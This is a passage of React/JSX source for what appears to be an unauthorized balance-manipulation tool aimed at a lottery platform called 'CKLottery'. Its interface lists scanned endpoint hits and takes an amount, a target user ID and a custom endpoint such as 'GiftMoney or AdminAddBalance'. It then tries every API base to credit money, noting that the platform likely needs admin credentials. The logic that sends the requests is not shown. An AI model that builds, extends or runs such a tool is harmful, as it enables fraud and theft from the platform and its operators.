                      className="w-full text-left flex items-start gap-2 bg-yellow-50 rounded-lg px-3 py-1.5 active:bg-yellow-100">
                      <span className="text-yellow-600 text-xs font-bold shrink-0 mt-0.5">⚠</span>
                      <div className="min-w-0">
                        <span className="text-xs font-mono text-yellow-800">[{r.base}] {r.ep}</span>
                        <div className="text-xs text-yellow-700 break-all leading-tight">code={String(r.code)} {r.msg.slice(0, 60)}</div>
                      </div>
                    </button>
                  ))}
                </>
              )}
              {scanDone && hitEps.length === 0 && otherEps.length === 0 && (
                <div className="text-xs text-gray-500 italic">No endpoints found — CKLottery likely requires admin credentials.</div>
              )}
            </div>
          )}
        </div>

        {/* ── AMOUNT ── */}
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
          <div className="text-sm font-semibold text-gray-700 mb-3">Amount (MMK)</div>
          <div className="flex items-center gap-2 border border-gray-200 rounded-xl px-4 py-3 bg-gray-50 mb-3">
            <span className="text-gray-400 text-base font-medium">K</span>
            <input type="number" value={addBalAmount} onChange={e => setAddBalAmount(e.target.value)}
              className="flex-1 bg-transparent text-xl font-bold text-gray-900 outline-none" inputMode="numeric" />
          </div>
          <div className="grid grid-cols-3 gap-2">
            {presets.map(p => (
              <button key={p} type="button" onClick={() => setAddBalAmount(String(p))}
                className={`py-2 rounded-xl text-sm font-semibold border transition-colors ${Number(addBalAmount) === p ? "bg-blue-500 text-white border-blue-500" : "bg-gray-50 text-gray-700 border-gray-200"}`}>
                K{p.toLocaleString()}
              </button>
            ))}
          </div>
        </div>

        {/* ── TARGET USER ── */}
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
          <div className="text-sm font-semibold text-gray-700 mb-2">Target User ID</div>
          <input type="number" placeholder={uid ? `Your ID: ${uid}` : "User ID"} value={addBalUserId}
            onChange={e => setAddBalUserId(e.target.value)}
            className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 bg-gray-50 focus:outline-none focus:border-blue-400"
            inputMode="numeric" />
          {uid > 0 && !addBalUserId && <p className="text-xs text-gray-400 mt-1.5">Leave blank → credit your own account (ID: {uid})</p>}
        </div>

        {/* ── CUSTOM ENDPOINT ── */}
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-4">
          <div className="text-sm font-semibold text-gray-700 mb-2">
            Custom Endpoint <span className="text-gray-400 font-normal">(optional — tap a scan hit to fill)</span>
          </div>
          <input type="text" placeholder="e.g. GiftMoney or AdminAddBalance"
            value={addBalCustomEp} onChange={e => setAddBalCustomEp(e.target.value)}
            className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 bg-gray-50 focus:outline-none focus:border-blue-400" />
        </div>

        {addBalResult && (
          addBalResult.ok
            ? <div className="bg-green-50 border border-green-200 rounded-2xl p-4 mb-4 flex items-center gap-3">
                <span className="text-2xl">✅</span>
                <div className="text-green-800 font-semibold text-sm">{addBalResult.msg}</div>
              </div>
            : <div className="bg-red-50 border border-red-200 rounded-2xl p-4 mb-4 text-red-700 text-xs break-all">{addBalResult.msg}</div>
        )}

        <button type="button" disabled={addBalLoading || !addBalAmount || Number(addBalAmount) <= 0}
          onClick={doAddBalance}
          className="w-full bg-green-500 disabled:bg-green-300 text-white py-4 rounded-2xl font-bold text-base shadow active:opacity-80 mb-16">
          {addBalLoading ? "Trying all bases…" : `➕ Add K${Number(addBalAmount || 0).toLocaleString()} to Account`}
        </button>
      </SubPage>
    );
  }

  return <MainPage claims={claims} userInfo={userInfo} balance={balance} balanceLoading={balanceLoading} balanceError={balanceError} tokenExpired={tokenExpired} onNav={navTo} onLogout={onLogout} onRefreshBalance={refreshBalance} />;
}
